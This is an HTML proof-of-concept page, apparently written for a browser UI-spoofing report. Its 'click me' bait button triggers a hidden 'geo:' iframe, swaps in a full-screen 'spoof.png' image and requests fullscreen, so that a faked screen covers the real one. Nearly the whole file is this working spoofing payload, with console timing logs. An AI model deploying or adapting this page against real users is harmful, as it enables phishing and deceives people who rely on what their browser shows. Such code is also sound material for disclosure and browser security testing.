<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
    />
    <title>tester-diag</title>
    <style>
      html,
      body {
        margin: 0;
        padding: 0;
        width: 100%;
        height: 100%;
        overflow: hidden;
        overscroll-behavior: none;
        touch-action: none;
        background: #fff;
        text-align: center;
        font-family: sans-serif;
      }
      #spoof {
        display: none;
        position: fixed;
        inset: 0;
        width: 100%;
        height: 100%;
        object-fit: cover;
        transform: translateZ(0);
        backface-visibility: hidden;
        user-select: none;
        -webkit-user-select: none;
        pointer-events: none;
      }
      #bait {
        position: fixed;
        inset: 0;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
      }
      button {
        padding: 15px 30px;
        font-size: 18px;
        cursor: pointer;
        touch-action: manipulation;
      }
    </style>
  </head>
  <body>
    <img id="spoof" src="spoof.png" alt="spoof" decoding="sync" />

    <div id="bait">
      <h2>click button below</h2>
      <button id="btn">click me</button>
    </div>

    <script>
      const btn = document.getElementById("btn");
      const bait = document.getElementById("bait");
      const spoof = document.getElementById("spoof");

      const logEvent = (label, extra = "") => {
        const ts = performance.now().toFixed(2);
        console.info(`[PoC +${ts}ms] ${label}`, extra);
      };

      spoof.addEventListener("load", () => {
        logEvent("spoof image loaded", `${spoof.naturalWidth}x${spoof.naturalHeight}`);
      });

      spoof.addEventListener("error", () => {
        logEvent("spoof image failed to load");
      });

      document.addEventListener("fullscreenchange", () => {
        logEvent("fullscreenchange", `activeElement=${document.fullscreenElement?.id || "none"}`);
      });

      document.addEventListener("fullscreenerror", (err) => {
        logEvent("fullscreenerror", err?.type || "unknown");
      });

      btn.addEventListener("click", () => {
        logEvent("click received");

        const geoFrame = document.createElement("iframe");
        geoFrame.style.display = "none";
        geoFrame.src = "geo:0,0?q=apple.com";
        document.body.appendChild(geoFrame);
        logEvent("geo iframe appended", geoFrame.src);

        bait.style.display = "none";
        spoof.style.display = "block";
        logEvent("dom visibility toggled");

        if (document.documentElement.requestFullscreen) {
          document.documentElement
            .requestFullscreen()
            .then(() => logEvent("requestFullscreen resolved"))
            .catch((err) => logEvent("requestFullscreen rejected", err?.message || String(err)));
        } else {
          logEvent("requestFullscreen unsupported");
        }
      });
    </script>
  </body>
</html>
